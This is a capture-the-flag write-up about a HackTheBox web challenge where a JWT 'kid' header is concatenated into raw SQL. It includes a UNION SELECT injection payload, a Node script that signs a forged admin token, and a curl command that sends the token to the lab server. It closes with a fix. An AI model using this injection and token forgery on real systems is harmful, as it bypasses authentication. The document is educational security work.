---
title: "Majestic Sales — JWT kid SQLi → Forged Admin Token"
published: 2026-08-31
description: "The JWT verification secret is looked up from the DB using the token's own kid header — concatenated into raw SQL. A UNION SELECT lets you supply the verifying key and forge an admin token."
tags: ["CTF", "Web", "SQL Injection", "JWT", "HackTheBox"]
category: CTF
draft: false
---

> **Target:** `http://154.57.164.82:32051` · Express · JWT (HS256) · multi-tenant · SQLite
> **Vuln:** SQL injection via JWT `kid` header · **Severity:** Critical

## Gist

The JWT verification secret is fetched from the database using the token's own `kid` header — concatenated into a raw SQL string. A `UNION SELECT` in `kid` makes the server return a *secret you chose*, so you can forge a token as `admin` that verifies against your own key. The admin dashboard then reads `/flag`.

## The vulnerable lookup

The app is multi-tenant: each tenant has a `kid`, a `tenant` name, and an HMAC `secret`. Login signs a JWT with that tenant's secret and stamps the `kid` into the header. On every authenticated request the middleware reads the `kid` back *from the untrusted token* and looks up the secret:

```js
// database.js — getAppKey()
async getAppKey(kid) {
  // TODO: add parametrization
  let query = `SELECT * FROM app_config WHERE kid = '${kid}';`;  // <-- SQLi
  return await this.db.get(query);
}
```

```js
// middleware/AuthMiddleware.js (flow)
JWTHelper.getKid(req.cookies.session)   // = jwt.decode(token).header.kid  → attacker-controlled
  .then(kid => db.getAppKey(kid)        // SQLi here
  .then(appKey => JWTHelper.verify(token, appKey.secret)  // verifies with the row we returned
  .then(data => { req.data = { username: data.username, tenant: data.tenant }; next(); })));
```

The `kid` header is just base64 in the JWT — no signature is needed to set it. Because `getAppKey` returns the `secret` used to **verify** the very same token, controlling the query output means controlling the verification key.

## The payoff

```js
// routes/index.js — /dashboard
if (user.username == "admin") flag = fs.readFileSync('/flag', 'utf8');
```

So the goal is simply a token that (a) verifies and (b) has `username: "admin"`. We supply both the payload and the verifying secret via the injection.

## Exploit

1. Pick an arbitrary secret you know, e.g. `pwn`. Build a JWT whose header `kid` injects a `UNION SELECT` returning that secret:

   ```sql
   ' UNION SELECT 'x','admin','pwn'-- -
   ```

   The resulting query becomes `SELECT * FROM app_config WHERE kid = '' UNION SELECT 'x','admin','pwn'-- -'`, yielding a row with `secret = "pwn"`.

2. Sign the token with HS256 using `pwn`, payload `{ "username": "admin", "tenant": "gr_office" }`, and that `kid` in the header:

   ```js
   const jwt = require('jsonwebtoken');
   const kid = "' UNION SELECT 'x','admin','pwn'-- -";
   const token = jwt.sign(
     { username: 'admin', tenant: 'gr_office' },
     'pwn', { algorithm: 'HS256', header: { kid } });
   ```

3. Send it as the `session` cookie to `/dashboard`. The middleware returns our injected secret, the token verifies, `username === "admin"`, and the response renders the flag:

   ```bash
   curl -s http://154.57.164.82:32051/dashboard -H "Cookie: session=$token" | grep -o 'HTB{[^}]*}'
   ```

> **Note:** The tenant secrets are random per-deploy — brute force is hopeless. The SQLi sidesteps them entirely by supplying the verifying key itself.

## Flag

```
HTB{…captured via forged admin JWT…}
```

## Takeaways

- Deriving the verification key from an attacker-controlled token field (`kid`) is the root sin — it turns *any* read primitive into full auth bypass.
- The SQLi didn't need to exfiltrate anything; the `UNION SELECT` output *is* the secret the app then trusts.
- **Fix:** parameterize the `kid` lookup; treat `kid` as an opaque identifier validated against a known set; never let untrusted input choose the verification key.
